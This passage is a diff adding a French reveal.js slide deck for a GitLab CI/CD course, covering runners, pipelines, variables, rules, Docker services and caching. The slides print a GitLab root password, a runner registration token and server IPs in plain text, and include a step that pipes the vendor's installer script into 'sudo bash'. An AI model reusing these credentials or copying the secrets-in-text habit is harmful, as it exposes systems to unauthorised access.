@@ -1,0 +1,2513 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Whoami</title>
+		<link rel="stylesheet" href="dist/reset.css">
+		<link rel="stylesheet" href="dist/reveal.css">
+<link rel="stylesheet" href="dist/theme/white.css" id="theme">
+		<!-- Theme used for syntax highlighted code -->
+<link rel="stylesheet" href="plugin/highlight/zenburn.min.css" id="highlight-theme"></head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+<section data-markdown ><textarea data-template>
+---
+
+# Whoami
+
+
+---
+
+# Becode ?
+
+---
+
+## Automatisation Avancée avec GitLab CI/CD
+- Révision rapide de GitLab CI/CD et de ses concepts de base.
+- Pipeline
+- Jobs et stage
+- Runners
+- Personnalisation des runners GitLab pour répondre aux besoins spécifiques du projet.
+- Création de projet NestJS et Angular
+- Déploiment avec Docker
+...
+
+---
+
+## Connexion en ssh 
+
+> Login gitlab: root:Test1234!
+
+```
+ssh azureuser@YOUR-IP -i userX.pem
+```
+
+---
+
+**Documentation :** 
+- [Installation sur debian](https://about.gitlab.com/install/#debian)
+- [Next Steps](https://docs.gitlab.com/ee/install/next_steps.html)
+
+---
+  
+
+
+## Installation Gitlab Runner
+```bash
+curl -L "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh" | sudo bash
+```
+
+Et ensuite :  
+
+```
+sudo apt-get install gitlab-runner
+```
+
+```
+sudo gitlab-runner start
+```
+
+--- 
+
+Vérification du status de gitlab-runner
+
+```
+sudo gitlab-runner status
+```
+ 
+Bien mettre les droits sudo quand on register le runner.
+
+---
+
+Une fois que tout cela est fini, nous devons rajouter l'ip de gitlab dans le fichier de config de gitlab-runner
+```
+[runners.docker]
+  extra_hosts = ["gitlab.das.becode:20.13.147.210","registry.das.becode:20.13.147.210"]
+
+```
+
+
+---
+# Configuartion des users et des groupes
+
+---
+
+## 1. Mode admin
+Tout d'abord, il faut passer en mode Admin.  Pour ce faire il faut cliquer en bas à gauche sur ``Admin Area``.
+
+---
+
+## 2. Création d'un utilisateur
+- On créé un utilisateur en cliquant sur "New users" 
+- Il faut que l'on remplisse le nom, pseudonyme et l'email. La personne pourra se connecter et changer son mot de passe à sa première connection. 
+- L'option ``Projects limit`` definit le nombre de repo que pourra créer l'utilisateur.
+
+---
+Il faut également déterminer le niveau d'accès de l'utilisateur.
+
+* **Regular :**  
+Les utilisateurs réguliers ont accès à leurs propres groupes et projets dans GitLab.
+Cela signifie qu'ils peuvent travailler sur les projets auxquels ils sont associés, créer de nouveaux projets dans ces groupes, et utiliser les fonctionnalités associées à leurs projets spécifiques.
+
+* **Administrator :**  
+Les administrateurs ont un accès illimité à tous les groupes, projets, utilisateurs et fonctionnalités de GitLab.
+Ils ont le plus haut niveau de privilèges, ce qui leur permet de configurer et de gérer l'ensemble du système GitLab, y compris les droits d'accès des autres utilisateurs.
+
+* **External :**
+Les utilisateurs externes ne peuvent pas voir les projets internes ou privés à moins que l'accès ne leur soit explicitement accordé.
+Ils ne peuvent pas créer de projets, de groupes, ni de fragments de code personnels. Cela limite leur capacité à contribuer à des projets ou à créer du contenu dans GitLab.
+
+---
+
+La dernière option ``Validate user account`` permet à l'utilisateur de valider les détails de leur carte de crédit.
+Les utilisateurs validés ont accès à des minutes d'intégration continue gratuites sur des runners partagés.
+
+---
+
+## 3. Création d'un groupe
+Un groupe, permet de gérer la configuration sur un ensemble d'utilisateurs. 
+- Pour en créer un, il suffit de cliquer sur le ``+`` en haut à gauche.  
+- On peut importer un groupe d'une autrte instance de gitlab ou en créer un.  
+
+---
+
+### Exercice 
+- Creér un groupe par exemple ``BeCode``
+- Créer un utilisateur avec les droits admins
+
+---
+
+# Premier projet et création du premier runner
+
+---
+
+## Création du premier projet
+> gitlab > New Project > test
+
+---
+
+## Les pipelines, jobs et stages
+
+---
+
+### Job 
+
+Un "job" représente une tâche individuelle à accomplir dans le cadre du processus CI/CD. 
+
+```
+say_hello:
+  script:
+    - echo "Hello DAS!"
+```
+
+---
+### Stage 
+Les "stages" permettent d'organiser le pipeline et d'exécuter 
+des jobs de manière séquentielle ou parallèle, en fonction des besoins du projet.
+
+```
+stages:
+  - build
+  - test
+  - deploy
+```
+
+Bon à savoir, il n'est pas obligatoire d'avoir des stages pour déclencher des jobs.
+Depuis quelques temps, gitlab permet de faire de "Stageless".   
+
+---
+### Pipeline
+Chaque fois qu'un commit est effectué sur une branche surveillée (par exemple, la branche principale), 
+GitLab déclenche automatiquement la création d'un nouveau pipeline. Ce pipeline est un ensemble de "jobs" organisés en "Stages" (étapes).  
+
+```
+stages:
+  - build
+  - test
+  - deploy
+
+job_build:
+  stage: build
+  script:
+    - echo "Building the application..."
+
+job_test:
+  stage: test
+  script:
+    - echo "Running tests..."
+
+job_deploy:
+  stage: deploy
+  script:
+    - echo "Deploying the application..."
+```
+---
+
+
+## Création du premier runner
+
+Les runners sont des sous-processus qui vont se charger de faire les commandes (scripts) que vous avez définies dans votre gitlab-ci. Gitlab-CI est capable de fonctionner de différente manière :
+
+- SSH
+- Shell
+- Parallels
+- VirtualBox
+- Docker
+- Docker Machine (auto-scaling)
+- Kubernetes
+- Custom
+
+
+---
+
+## Comment choisir ?
+
+- **Shell**  
+  C'est le plus simple de tous. Vos scripts seront lancés sur la machine qui possède le Runner.
+- **Parallels, VirtualBox**   
+  Le Runner va créer (ou utiliser) une machine virtuelle pour exécuter les scripts. Pratique pour avoir un environnement spécifique (exemple macOS)
+- **Docker**  
+  Utilise Docker pour créer / exécuter vos scripts et traitement (en fonction de la configuration de votre .gitlab-ci.yml)
+- **Docker Machine (auto-scaling)**  
+  Identique à docker, mais dans un environnement Docker multimachine avec auto-scaling.
+- **Kubernetes**  
+  Lance vos builds dans un cluster Kubernetes. Très similaire à Docker-Machine
+- **SSH**  
+  À ne pas utiliser. Il existe, car il permet à Gitlab-CI de gérer l'ensemble des configurations possibles.
+
+---
+
+Il est donc préférable de priviliéger l'utilisation de ``docker`` 
+
+## Création du fichier ``.gitlab-ci.yaml``   
+```
+stages:
+  - build
+  - test
+
+job_build:
+  stage: build
+  script:
+    - echo "Building the project"
+
+job_test:
+  stage: test
+  script:
+    - echo "Running tests"
+```
+
+---
+
+- Pour créer un runner, il faut aller dans l'onglet ``settings`` dans le menu à gauche et on étend la rubrique ``Runners``
+- On choisit le runner pour Linux. Il faut également y indiquer un tag, mais on verra plus tard comment l'utiliser.
+- Enregistrer le runner (en sudo).
+
+````
+sudo gitlab-runner register  --url http://34.243.1.181  --token glrt-xkoyTMSpyfEsk6-DPYLS
+````
+
+et pour vérifier que le runner a bien été créer : 
+
+```
+sudo cat /etc/gitlab-runner/config.toml
+```
+---
+
+
+
+---
+
+## Différence entre User-mode et system-mode
+**Mode Utilisateur (User Mode) :**  
+- Portée : Le runner est spécifique à l'utilisateur qui l'a enregistré. Il ne sera accessible que pour cet utilisateur.
+- Permissions : Le runner aura les mêmes permissions que l'utilisateur qui l'a enregistré. Cela signifie qu'il peut accéder aux ressources et aux privilèges de cet utilisateur.
+
+**Mode Système (System Mode) :**  
+- Portée : Le runner est disponible pour tous les utilisateurs du système.
+- Permissions : Le runner aura généralement besoin de permissions élevées, car il peut être utilisé par n'importe quel utilisateur du système. Cela signifie qu'il peut accéder à des ressources qui nécessitent des privilèges élevés.
+
+---
+
+### Avantages et inconvénients :
+**Mode Utilisateur :**  
+- Avantages : Isolation des ressources par utilisateur. Chaque utilisateur peut avoir son propre runner avec des configurations spécifiques.
+- Inconvénients : Limité à un seul utilisateur. Si plusieurs utilisateurs ont besoin d'utiliser le runner, chaque utilisateur devra enregistrer son propre runner.
+
+**Mode Système :**  
+- Avantages : Disponible pour tous les utilisateurs, ce qui peut être pratique dans certains scénarios. Un seul runner peut être utilisé par tous les utilisateurs.
+- Inconvénients : Requiert généralement des privilèges élevés, ce qui peut représenter un risque de sécurité. Toutes les configurations seront partagées entre les utilisateurs et les tâches doivent être exécutées manuellement à l'aide de ``gitlab-runner run``
+
+---
+
+## Les tags 
+
+---
+
+- Il est possible de lancer les runners sans les tags, pource faire il faur cocher ``Run untagged jobs`` lors de la création du projet. 
+- Pour gérer efficacement les runners, il est préférable d'utiliser les tags afin de les réutiliser tant que possible. 
+- Si l'on teste en décochant la case, les runners resteront avec le statut pending. 
+- Si l'on modifie  le fichier ```gitlab-ci.yaml```, et que l'on rajoute un tag, on peut voir que seul le job qui a un tag sera lancé.
+
+---
+
+Edition du fichier .gitlab-ci.yaml
+
+```yaml
+stages:          # List of stages for jobs, and their order of execution
+  - test
+
+hello-job:      # This job runs in the deploy stage.
+  stage: test  # It only runs when *both* jobs in the test stage complete successfully.
+  image: debian:latest
+  tags: 
+    - docker
+  script:
+    - echo "Start..."
+    - echo "*****************************************************************"
+    - echo "-----------------------------------------------------------------"
+    - sleep 30
+    - echo "Application successfully deployed."
+
+```
+---
+
+## Les runners partagés
+Par défaut, les runners sont 'locked' lorsque qu'il est utilisé par un autre projet.
+![](https://media.discordapp.net/attachments/727923649738178571/1199291526434529280/image.png)
+
+Si l'on veut que le runner soit utilisé par plusieurs projet, il faut décocher la case. 
+
+Ensuite, il faut activer le runner dans les paramètres CI//CD du dépot.
+![](https://cdn.discordapp.com/attachments/727923649738178571/1199293028712591380/image.png?ex=65c203ab&is=65af8eab&hm=d60cbe135dcd2ca6069a57193246049de02313f1623ee1619e3b9e729088b8a8&)
+
+Il faut activer le mode en admin pour les configurés ``Admin area``
+
+---
+
+## Exercice
+**Créez 1 runners partagé.**  
+- L'un exécutera du code shell et aura comme tag shell.
+
+**Créer un fichier ``.gitlab-ci.yml``**
+- Avec 2 stages ``job_test`` et ``job_build``
+- Les deux jobs font un echo "Ceci est le job_test" et "Ceci est le job_build"
+  
+
+
+
+
+# Les Variables
+
+---
+
+# Les Différents Types de Variables dans GitLab
+
+---
+##  Variables d'Environnement
+Les variables d'environnement sont les plus courantes dans GitLab CI/CD. Elles servent à stocker des données qui peuvent être utilisées par les scripts des jobs. Par exemple, vous pouvez définir une variable DATABASE_URL pour stocker l'URL de votre base de données. Ces variables sont accessibles dans les scripts de pipeline en utilisant la syntaxe standard des variables d'environnement, comme $DATABASE_URL dans un script shell.
+
+---
+
+## Variables Protégées
+Les variables protégées sont d'utiles pour stocker des données sensibles qui ne doivent être utilisées que dans un environnement de production ou un environnement similaire sécurisé. Par exemple, vous pouvez avoir une clé API qui ne doit être utilisée que lors du déploiement en production.
+
+---
+
+## Variables Masquées
+Les variables masquées sont une fonctionnalité de sécurité qui empêche la valeur de la variable d'être affichée dans les logs de GitLab. C'est particulièrement important pour les secrets, comme les mots de passe ou les clés API. Lorsqu'une variable est masquée, sa valeur est remplacée par des astérisques dans les logs d'exécution de pipeline.
+
+---
+> Création de deux variables ``$MY_MASKED_VARIABLE`` & ``$MY_PROTECTED_VARIABLE``
+
+```
+job_example:
+  script:
+    - echo $MY_MASKED_VARIABLE  # Cette variable est protégée et ne sera pas visible dans les logs
+    - echo $MY_PROTECTED_VARIABLE  # Cette variable sera visible dans les logs
+  tags:
+    - docker
+```
+
+---
+
+## Les variables predéfinies
+Les variables prédéfinies dans GitLab CI/CD sont des variables automatiquement définies par le système et mises à la disposition de vos jobs lors de l'exécution d'un pipeline. 
+
+1. Variables relatives au pipeline :
+	- $CI_PIPELINE_ID: L'ID unique du pipeline.
+	- $CI_PIPELINE_IID: L'ID interne du pipeline.
+	- $CI_COMMIT_REF_NAME: Le nom de la branche ou de l'étiquette en cours.
+	- $CI_COMMIT_REF_PROTECTED: Indique si la branche ou l'étiquette est protégée.
+2. Variables relatives au commit associé :
+	- $CI_COMMIT_SHA: Le SHA-1 du commit associé au pipeline.
+	- $CI_COMMIT_SHORT_SHA: La version courte (7 premiers caractères) du SHA-1 du commit.
+	- $CI_COMMIT_BRANCH: Le nom de la branche du commit associé.
+	- $CI_COMMIT_TAG: Le nom de l'étiquette si le commit est associé à une étiquette
+
+
+* liste : https://docs.gitlab.com/ee/ci/variables/predefined_variables.html
+--- 
+
+Exemple : 
+* sans stage (juste des jobs)
+```
+start-job: 
+  tags:
+    - shell     
+  script:
+    - echo "Start..."
+    - echo "$CI_JOB_ID"
+end-job:
+  tags:
+    - shell     
+  script:
+    - echo "ended !!"  
+```
+---
+
+## Les variables globales
+
+```
+variables:
+  GLOBAL_VAR: "Hello"
+start-job: 
+  tags:
+    - shell     
+  script:
+    - echo "Start..."
+    - echo "$GLOBAL_VAR"
+    - echo "ended !!"
+```
+
+---
+
+## Les Variables locales (à un job)
+
+```
+variables:
+  GLOBAL_VAR: "Hello"
+start-job: 
+  tags:
+    - shell
+  variables:
+    LOCAL_VAR: "Hello DAS !!" 
+  script:
+    - echo "Start..."
+    - echo "$LOCAL_VAR"
+    - echo "ended !!"
+```
+
+---
+
+## Les Variables local vs global
+
+```
+variables:
+  VAR: "Hello"
+start-job: 
+  tags:
+    - shell
+  variables:
+    VAR: "Hello DAS !!" 
+  script:
+    - echo "Start..."
+    - echo "$VAR"
+    - echo "ended !!"
+```
+
+---
+
+## Les Variables GROUP 
+
+* group > settings > CICD > Variables
+
+---
+# Les Architectures de pipelines
+
+Documentation GitLab : [Pipeline Architectures](https://docs.gitlab.com/ee/ci/pipelines/pipeline_architectures.html)
+
+Il existe 3 types d'architectures :
+
+- **Basic pipelines**
+- **Direct Acyclic Graph (DAG) pipelines**
+- **Parent/enfants pipelines : place à votre imagination...**
+
+---
+
+## BASIC PIPELINE
+
+Il s'agit de l'architecture la plus commune. 
+
+
+		Etapes		Stage1		Stage2		Stage3
+		
+  		Jobs
+				Job1		Job3		Job5
+				Job2		Job4		Job6
+
+-----------------------------------------------------------------------------------------------------------------
+![Basic Pipeline](https://cdn.discordapp.com/attachments/727923649738178571/1200409513354870814/image.png)
+-----------------------------------------------------------------------------------------------------------------
+
+**Exemple :** 
+
+```yaml
+stages:
+  - stage1
+  - stage2
+job1:
+  stage: stage1
+  script:
+    - echo "stage1 - job1"
+job2:
+  stage: stage1
+  script:
+    - echo "stage1 - job2"
+```
+-----------------------------------------------------------------------------------------------------------------
+
+## Direct Acyclic Graph (DAG) pipelines
+
+- Ce modèle utilise un graphe acyclique dirigé (DAG) pour représenter les dépendances entre les jobs.
+- Les jobs s'exécutent dans l'ordre défini, mais les stages peuvent être exécutées en parallèle.
+- ``needs: [job1]`` indique que le job2 dépend du job1.
+
+![image](https://cdn.discordapp.com/attachments/727923649738178571/1200414668406149210/image.png)
+
+-----------------------------------------------------------------------------------------------------------------
+
+**Exemple :** 
+
+```yaml
+stages:
+  - stage1
+  - stage2
+job1:
+  stage: stage1
+  script:
+    - echo "stage1 - job1"
+    - exit 0
+  tags:
+    - docker
+job4:
+  stage: stage1
+  tags:
+    - docker
+  script:
+    - echo "stage1 - job4"
+job2:
+  stage: stage2
+  tags:
+    - docker
+  needs: [job1]
+  script:
+    - echo "stage2 - job2"
+job5:
+  stage: stage2
+  tags:
+    - docker
+  needs: [job4]
+  script:
+    - echo "stage2 - job5"
+```
+
+-----------------------------------------------------------------------------------------------------------------
+
+## PARENT/ENFANTS PIPELINE
+
+- Découper en différents fichiers ``.gitlab-ci``
+- Gestion de déclenchement suivant des répertoires spécifiques
+- Gestion de blocs
+- Solution efficace pour le monorepo
+
+**Pipeline :**
+```
+		caseA : stage1	stage2	stage3
+		caseB : stage21	stage22	stage23
+```
+-----------------------------------------------------------------------------------------------------------------
+
+**Exemple :**
+
+```yaml
+trigger-ui:
+  trigger:
+    include: ui/.gitlab-ci.yml
+    strategy: depend
+
+trigger-backend:
+  trigger:
+    include: backend/.gitlab-ci.yml
+    strategy: depend
+
+```
+
+Strategy: depend permet d'affecter le pipeline parent. Par exemple si un des pipelines enfants ne s'execute pas correctement,
+le pipeline parent sera stoppé. 
+
+--------------------------------------------------------------------------------------------------------
+
+**Exercice :**
+
+- Créer un pipeline avec 2 pipelines enfants, ui et backend.
+- Faire un echo. 
+
+# Contrôle d'exécution avec rules
+---
+Documentation GitLab : [rules](https://docs.gitlab.com/ee/ci/yaml/?query=rules)
+(L'utilisation des moits clés only, except sont dépréciés)
+
+Le mots-clé rules est utilisé pour contrôler l'exécution des jobs.
+
+Il accepte, un array avec les mots clés suivants : 
+* if
+* changes
+* exists
+* allow_failure
+* variables
+* when
+
+---
+
+## Avec des variables
+Tout dabord, il faut créer le variable dans ``settings> CI CD > Variables``
+Par exemple ``VAR:1234``.
+```yaml
+job:
+  tags:
+    - shell
+  rules:
+    - if: $VAR == "test"
+  script:
+    - echo "Ne s'éxecute quand quand la condition est remplie."
+```  
+---
+
+Et ensuite on lancer un pipeline sans modifier la variable.
+
+La runner ne lance pas car la condition n'est pas remplie. Mais si l'on modifie la variable, cette fois le runner se lancera.  
+
+![](https://media.discordapp.net/attachments/727923649738178571/1200806979023683604/image.png)
+
+Cela fonctionne également avec les variables inclues de gitlab
+
+---
+
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute si la condition est satisfaite"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+```
+
+Dans cet exemple, le job sera exécuté uniquement si la branche du commit est "main". 
+
+---
+
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute si le commit est tagué"
+  rules:
+    - if: '$CI_COMMIT_TAG'
+```
+Ici, le job sera exécuté uniquement si le commit est associé à un tag.
+
+---
+
+## Rules avec la condition when 
+
+---
+
+### on_success
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute si les jobs précédents ont réussi"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: on_success
+```
+Dans cet exemple, le job sera exécuté uniquement si la branche du commit est "main" et si tous les jobs précédents dans le pipeline ont été exécutés avec succès.
+
+---
+
+### manual
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute lorsque déclenchée manuellement"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: manual
+```
+Dans cet exemple, le job ne s'exécute que lorsque l'utilisateur le déclenche manuellement, indépendamment des autres de la réussite des autres jobs.
+
+---
+
+### delayed
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute après un délai de 30 minutes"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: delayed
+      start_in: 30 minutes
+```
+Ici, le job s'exécute automatiquement, mais il est retardé de 30 minutes à partir du déclenchement du pipeline.
+
+---
+
+### scheduled
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute à une heure et une date spécifiques"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: scheduled
+      cron: "0 12 * * *"
+```
+Dans cet exemple, le job est planifié pour s'exécuter tous les jours à midi.
+
+---
+
+### Exercice 
+- Créer un job nommé ``job_failure`` qui se déclenche uniquement si un des jobs précédent à échouer et que la branche du commit soit "main"
+- Créer un job nommé ``job_scan`` sera toujours exécuté, quelle que soit la réussite ou l'échec des jobs précédents, tant que la branche du commit est "main"
+
+---
+
+#### Réponse ``on_failure``
+```yaml
+job_failure:
+  script:
+    - echo "Cette étape s'exécute si les jobs précédents ont échoué"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: on_failure
+```
+Ce job s'exécutera uniquement si la branche du commit est "main" et si au moins l'un des jobs précédents dans le pipeline a échoué.
+
+---
+
+#### Réponse ``always``
+```yaml
+job_scan:
+  script:
+    - echo "Cette étape s'exécute toujours, quels que soient les résultats précédents"
+  rules:
+    - if: '$CI_COMMIT_BRANCH == "main"'
+      when: always
+```
+Ici, le job sera toujours exécuté, quelle que soit la réussite ou l'échec des jobs précédents, tant que la branche du commit est "main".
+
+---
+
+## Les Conditions sur des Fichiers
+
+---
+### change
+La condition change vous permet de spécifier des fichiers ou des répertoires qui, lorsqu'ils sont modifiés dans un commit, autorise l'exécution d'un job. Cela peut être utile pour des tâches telles que la compilation du code uniquement lorsqu'un fichier source est modifié.
+
+---
+
+Voici un exemple :
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute si le fichier 'config.yaml' est modifié"
+  rules:
+    - changes:
+        - config.yaml
+```
+Dans cet exemple, le job sera exécuté uniquement si le fichier config.yaml est modifié dans le commit actuel.
+
+---
+**Exercice:**
+Reprennez le pipeline parent-child, et rajouter les règles suivantes.
+
+- S'il y a des modifications dans le dossier ui, alors le pipeline ui s'executera
+- S'il y a des modifications dans le dossier backend, alors le pipeline backend se déclenche
+---
+
+Réponse :
+```
+trigger-ui:
+  trigger:
+    include: ui/.gitlab-ci.yml
+    strategy: depend
+  rules:
+    - changes: [ui/*]
+trigger-backend:
+  trigger:
+    include: backend/.gitlab-ci.yml
+    strategy: depend
+  rules:
+    - changes: [backend/*]
+```
+---
+
+### exist
+La condition exist vous permet de vérifier l'existence d'un fichier ou d'un répertoire dans le référentiel. Si le fichier ou le répertoire existe, le job est exécuté.
+
+Voici un exemple :
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute si le fichier 'data.csv' existe"
+  rules:
+    - exists:
+        - data.csv
+```
+Dans cet exemple, le job sera exécuté uniquement si le fichier data.csv existe dans le référentiel
+
+
+### Exercice
+Créer un job qui s'éxecute uniquement si le fichier ``config.yaml``est modifié et que le fichier ``.env`` existe.
+
+#### Réponse
+```yaml
+job:
+  script:
+    - echo "Cette étape s'exécute si 'config.yaml' est modifié et '.env' existe"
+  rules:
+    - changes:
+        - config.yaml
+    - exists:
+        - .env
+```
+
+## Les workflows 
+La directive workflow permet de contrôler le déclenchement de l'ensemble du pipeline basé sur des conditions, contrairement aux règles appliquées à des jobs individuels.
+```
+workflow:
+  rules:
+    - if: '$CI_PIPELINE_SOURCE == "push"'
+    - if: '$CI_COMMIT_BRANCH == "main"'
+```
+Dans cet exemple, le pipeline est déclenché si le déclencheur est un push sur la branche principale (main).
+# Docker
+
+Créons un nouveau runner avec un tag ``docker``
+
+Ensuite enregistrons le runner sur le serveur: 
+
+```
+sudo gitlab-runner register --url http://gitlab.das.becode
+```
+---
+Il est possible que vous rencontriez une erreur ``Could not resolve host``, il faut éditer le fichier :
+
+
+```
+ sudo nano /etc/gitlab-runner/config.toml
+```
+et rajouter la ligne suivante 
+
+```
+[[runners]]
+  ...
+  [runners.docker]
+    ....
+    extra_hosts = ["gitlab.das.becode:20.13.147.210"]
+```
+---
+Et un exemple de fichier ``.gitabl-ci.yaml``  
+
+```yaml
+stages:
+  - test
+
+job_hello_world:
+  stage: test
+  tags:
+    - docker
+  script:
+    - echo "Hello"
+    - sleep 60
+    - echo "end"
+```
+---
+
+**Exercice:**
+- Créer un runner docker et un fichier gitlab-ci avec un script qui fait un echo "Hello Das"
+- Utilisez l'image ubuntu:latest
+# Les services
+---
+Lorsque vous configurez CI/CD, vous spécifiez une image, qui est utilisée pour créer le conteneur dans lequel vos tâches s'exécutent. Pour spécifier cette image, vous utilisez le mot-clé ``ìmage``.
+
+Vous pouvez spécifier une image supplémentaire en utilisant le mot-clé ``services``. Cette image supplémentaire est utilisée pour créer un autre conteneur, disponible pour le premier conteneur. Les deux conteneurs ont accès l'un à l'autre et peuvent communiquer lors de l'exécution du travail.
+
+---
+```yaml
+variables:
+  DOCKER_TLS_CERTDIR: ""
+  FF_NETWORK_PER_BUILD: "true"
+  POSTGRES_DB: postgres
+  POSTGRES_USER: runner
+  POSTGRES_PASSWORD: postgres
+  POSTGRES_HOST_AUTH_METHOD: trust
+stages:    
+  - test
+Testing:
+  stage: test
+  image: debian:latest
+  services:
+    - postgres
+  script:
+    - apt update && apt install -y postgresql-client
+    - PGPASSWORD=$POSTGRES_PASSWORD psql -U $POSTGRES_USER -h postgres -d postgres -c "\l"
+  tags:
+  - docker
+```
+---
+
+Les services sont des conteneurs Docker qui peuvent être liés à vos jobs pour 
+fournir des dépendances ou des services nécessaires à l'exécution de vos tests ou de votre pipeline. 
+
+L'utilisation de services est particulièrement utile lorsque vous souhaitez isoler votre job 
+et ses dépendances sans avoir à installer ces dépendances directement sur le runner. 
+Les services peuvent être démarrés avant l'exécution du job et arrêtés après son achèvement.
+
+Il est également possible d'utiliser plueirurs services avec différentes versions. 
+
+---
+```yaml
+variables:
+  DOCKER_TLS_CERTDIR: ""
+  FF_NETWORK_PER_BUILD: "true"
+  POSTGRES_DB: postgres
+  POSTGRES_USER: runner
+  POSTGRES_PASSWORD: postgres
+  POSTGRES_HOST_AUTH_METHOD: trust
+Testing:
+  stage: test
+  image: debian:latest
+  services:
+    - name: postgres:14.1-alpine
+      alias: mydb1
+    - name: postgres:10.19-stretch
+      alias: mydb2
+    - name: postgres:9-alpine3.14
+      alias: mydb3
+  script:
+    - apt update && apt install -y postgresql-client
+    - PGPASSWORD=$POSTGRES_PASSWORD psql -U $POSTGRES_USER -h mydb1 -d postgres -c "SELECT version();"
+    - PGPASSWORD=$POSTGRES_PASSWORD psql -U $POSTGRES_USER -h mydb2 -d postgres -c "SELECT version();"
+    - PGPASSWORD=$POSTGRES_PASSWORD psql -U $POSTGRES_USER -h mydb3 -d postgres -c "SELECT version();"
+  tags:
+  - docker
+```
+---
+
+Example avec mysql :
+
+```yaml
+variables:
+  DOCKER_TLS_CERTDIR: ""
+  FF_NETWORK_PER_BUILD: "true"
+  MYSQL_DATABASE: "db_name"
+  MYSQL_ROOT_PASSWORD: "dbpass"
+  MYSQL_USER: "username"
+  MYSQL_PASSWORD: "dbpass"
+  MYSQL_HOST: mysql
+stages:    
+  - test
+Testing:
+  image: debian:latest
+  services:
+    - mysql
+  stage: test
+  script:
+    - apt update && apt install -y mariadb-client
+    - echo "SHOW tables;" | mysql -u root -p"$MYSQL_ROOT_PASSWORD" -h mysql "${MYSQL_DATABASE}"
+    - echo "CREATE TABLE das (field1 int);" | mysql -u root -p"$MYSQL_ROOT_PASSWORD" -h mysql "${MYSQL_DATABASE}"
+    - echo "SHOW tables;" | mysql -u root -p"$MYSQL_ROOT_PASSWORD" -h mysql "${MYSQL_DATABASE}"
+  tags: 
+    - docker
+```
+---
+Comme pour les images, on peut définir l'entrypoint et les éventuelles commandes
+
+```
+default:
+  services:
+    - name: postgres:11.7
+      alias: db
+      entrypoint: ["docker-entrypoint.sh"]
+      command: ["postgres"]
+```
+
+---
+
+**Exercice :**
+- Créez un pipeline qui utilise l'image alpine:latest et avec un service nginx:latest. Le service nginx doit avoir un alias 'myngnix'
+- Faites un script qui ``curl mynginx``
+
+---
+
+**Réponse :**
+
+```yaml
+variables:
+  DOCKER_TLS_CERTDIR: ""
+  FF_NETWORK_PER_BUILD: "true"
+stages:
+  - test
+Testing:
+  stage: test
+  image: alpine:latest
+  services:
+    - name: nginx:latest
+      alias: mynginx
+  script:
+    - apk add --no-cache curl
+    - curl mynginx -k
+  tags:
+  - docker
+
+```
+# Cache
+Le cache des runners dans GitLab CI/CD est un mécanisme qui permet de stocker 
+et de réutiliser des fichiers ou des répertoires entre différentes exécutions 
+de jobs sur le même runner.  
+
+Cela permet d'améliorer les performances des pipelines en évitant la répétition 
+de certaines tâches, comme la compilation de dépendances ou le téléchargement de bibliothèques (comme npm). 
+
+---
+```yaml
+cache:
+  key: my_cache_key
+  paths:
+    - .lib/
+    - node_modules/
+    - vendor/
+stages:
+  - stage1
+  - stage2
+job1:
+    stage: stage1
+    script: 
+      - mkdir -p .lib
+      - echo "Ceci est le cache partagé" > .lib/das.txt
+    tags:
+      - docker
+job2:
+    stage: stage2
+    script:
+        - cat .lib/das.txt
+    tags:
+      - docker
+
+```
+---
+Mais si on y ajoute une règle pour que le job1 ne s'éxécute que sur la branche main, alors le job ne poourra que s'éxécuter que si le fichier ``das.txt`` se trouve dans le cache. 
+
+```yaml
+cache:
+  key: my_cache_key
+  paths:
+    - .lib/
+    - node_modules/
+    - vendor/
+stages:
+  - stage1
+  - stage2
+job1:
+    stage: stage1
+    script: 
+      - mkdir -p .lib
+      - echo "Ceci est le cache partagé" > .lib/das.txt
+    rules:
+      - if: '$CI_COMMIT_BRANCH == "main"'
+    tags:
+      - docker
+job2:
+    stage: stage2
+    script:
+        - cat .lib/das.txt
+    tags:
+      - docker
+```
+---
+Le cache se vide aussi lorsque la key change. SI on utrilise une variable comme key, un nouveau cache sera utiliser à chaque fois que le noom de la key change.
+
+```yaml
+cache:
+  - key: $CI_COMMIT_REF_SLUG
+```
+
+---
+
+Exemple 
+```yaml
+cache:
+  - key: $CI_COMMIT_REF_SLUG
+    paths:
+      - .lib
+stages:
+  - step1
+  - step2
+j1:
+  stage: step1
+  script:
+    - mkdir -p .lib 
+    - echo $CI_COMMIT_REF_SLUG > .lib/$CI_COMMIT_REF_SLUG.txt
+  tags:
+    - docker
+j2:
+  stage: step2
+  script: 
+    - cat .lib/$CI_COMMIT_REF_SLUG.txt
+    - ls .lib/
+  tags:
+    - docker
+```
+---
+## Cache par Politique de Versions :
+
+La directive policy permet de spécifier une politique de cache, qui définit comment les caches doivent être gérés lors des différentes étapes du pipeline. Il existe trois valeurs possibles, pull, push et les deux combinés pull-push
+
+- pull : Indique que le cache doit être téléchargé depuis un cache partagé ou distant avant l'exécution du job.
+- push : Indique que le cache doit être poussé (enregistré) après l'exécution du job pour être utilisé par d'autres jobs ou pipelines.
+- pull-push : fait les deux; c'est le mode par défaut
+
+---
+
+```yaml
+stages:
+  - step1
+  - step2
+j1-1:
+  stage: step1
+  script:
+    - mkdir -p .lib 
+    - echo $CI_COMMIT_REF_SLUG-$CI_JOB_STAGE > .lib/$CI_COMMIT_REF_SLUG-$CI_JOB_STAGE.txt
+  cache:
+    - key: $CI_JOB_STAGE-$CI_COMMIT_REF_SLUG
+      paths:
+        - .lib
+      policy: pull
+  tags:
+    - docker
+j1-2:
+  stage: step1
+  script:
